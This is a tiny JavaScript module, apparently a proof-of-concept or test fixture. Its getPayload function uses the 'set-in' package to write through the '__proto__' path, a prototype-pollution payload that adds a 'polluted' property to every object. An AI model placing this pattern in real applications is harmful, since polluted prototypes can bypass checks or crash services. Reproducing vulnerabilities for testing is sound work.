function getPayload() {
    const si = require("set-in");
    const obj = {};

    si(obj, ["__proto__", "polluted"], "yes");

    return { obj };
}

module.exports = { getPayload };